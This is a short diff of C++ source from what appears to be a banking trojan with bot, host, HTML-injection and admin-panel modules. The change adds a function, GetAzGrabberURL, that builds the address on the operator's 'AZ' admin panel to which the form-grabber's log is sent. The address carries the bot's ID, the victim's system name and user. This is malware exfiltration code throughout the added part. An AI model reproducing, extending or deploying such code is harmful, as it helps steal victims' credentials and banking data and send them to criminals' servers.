@@ -3,6 +3,7 @@
 
 
 #include "Modules.h"
+#include "StrConsts.h"
 
 
 #ifdef AzConfigH
@@ -15,7 +16,7 @@
 #endif
 
 
-#include "Strings.h"
+#include "BotCore.h"
 #include "Config.h"
 #include "Utils.h"
 #include "BotHosts.h"
@@ -239,3 +240,27 @@ void AzInizializeHTMLInjects()
 //-----------------------------------------------------------------------------
 
 
+
+
+//------------------------------------------------------
+//  GetAzGrabberURL - Функция возвращает адрес в админке
+//  AZ для отправки лога грабера
+//------------------------------------------------------
+
+// Строка определена в модуле StrConsts.cpp
+extern CSSTR EStrAzGrabberPathMask[];
+
+string GetAzGrabberURL(const string& SystemName,  const char* Action)
+{
+	string Mask = GetStr(EStrAzGrabberPathMask);
+	string URL;
+
+	if (STRA::IsEmpty(Action))
+		Action = "save_tf";
+
+	URL.Format(Mask.t_str(), Bot->UID().t_str(), SystemName.t_str(), GetAzUser().t_str(), Action);
+	PCHAR Tmp = GetJavaScriptURL(URL.t_str());
+	URL = Tmp;
+	STR::Free(Tmp);
+    return URL;
+}
